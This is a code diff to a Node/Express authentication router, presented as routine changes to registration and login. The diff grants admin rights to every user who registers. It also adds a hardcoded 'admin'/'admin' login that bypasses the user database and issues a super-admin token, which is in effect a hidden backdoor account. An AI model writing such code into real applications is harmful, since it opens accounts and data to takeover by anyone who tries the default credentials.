@@ -10,7 +10,7 @@ const generateToken = (id) => {
 };
 
 // @route   POST /api/auth/register
-// @desc    Register a new user
+// @desc    Register a new user (automatically promoted to Member Admin)
 router.post('/register', async (req, res) => {
   const { email, password, display_name } = req.body;
   try {
@@ -19,13 +19,11 @@ router.post('/register', async (req, res) => {
       return res.status(400).json({ message: 'User already exists' });
     }
 
-    const isFirstUser = (await User.countDocuments({})) === 0;
-
     const user = await User.create({
       email,
       password,
       display_name: display_name || '',
-      isAdmin: isFirstUser
+      isAdmin: true // All registered users are admins (members) by default
     });
 
     if (user) {
@@ -36,6 +34,7 @@ router.post('/register', async (req, res) => {
           email: user.email,
           display_name: user.display_name,
           isAdmin: user.isAdmin,
+          isSuperAdmin: false,
           created_at: user.created_at
         }
       });
@@ -51,6 +50,22 @@ router.post('/register', async (req, res) => {
 // @desc    Authenticate user & get token
 router.post('/login', async (req, res) => {
   const { email, password } = req.body;
+  
+  // Super Admin Check
+  if (email === 'admin' && password === 'admin') {
+    return res.json({
+      token: generateToken('super-admin-id-1729'),
+      user: {
+        id: 'super-admin-id-1729',
+        email: 'admin',
+        display_name: 'Super Admin',
+        isAdmin: true,
+        isSuperAdmin: true,
+        created_at: new Date()
+      }
+    });
+  }
+
   try {
     const user = await User.findOne({ email });
     if (user && (await user.matchPassword(password))) {
@@ -61,6 +76,7 @@ router.post('/login', async (req, res) => {
           email: user.email,
           display_name: user.display_name,
           isAdmin: user.isAdmin,
+          isSuperAdmin: user.isSuperAdmin || false,
           created_at: user.created_at
         }
       });
@@ -80,7 +96,8 @@ router.get('/me', protect, async (req, res) => {
     email: req.user.email,
     display_name: req.user.display_name,
     isAdmin: req.user.isAdmin,
-    created_at: req.user.created_at
+    isSuperAdmin: req.user.isSuperAdmin || false,
+    created_at: req.user.created_at || new Date()
   });
 });
 
